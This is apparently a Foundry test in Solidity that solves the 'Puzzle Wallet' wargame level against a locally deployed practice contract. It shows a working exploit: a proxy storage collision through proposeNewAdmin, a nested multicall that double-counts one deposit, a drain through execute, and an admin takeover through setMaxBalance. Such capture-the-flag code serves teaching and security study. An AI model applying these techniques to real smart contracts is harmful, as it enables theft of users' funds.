// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/24_PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy proxy;
    address player;
    PuzzleWallet wallet;

    function setUp() public {
        player = vm.addr(1);

        PuzzleWallet puzzleWallet = new PuzzleWallet();

        bytes memory data = abi.encodeWithSelector(
            PuzzleWallet.init.selector,
            100 ether
        );
        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);
        wallet = PuzzleWallet(address(proxy));

        wallet.addToWhitelist(address(this));
        wallet.deposit{value: 0.001 ether}();
    }

    function testattacker() public {
        vm.deal(player, 0.001 ether);
        vm.startPrank(player, player);

        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(
            PuzzleWallet.multicall.selector,
            callsDeep
        );
        wallet.multicall{value: 0.001 ether}(calls);
        console.log("", address(wallet).balance);
        wallet.execute(player, 0.002 ether, "");
        console.log("", address(wallet).balance);
        wallet.setMaxBalance(uint256(uint160(player)));

        assertEq(proxy.admin(), player);

        vm.stopPrank();
    }
}
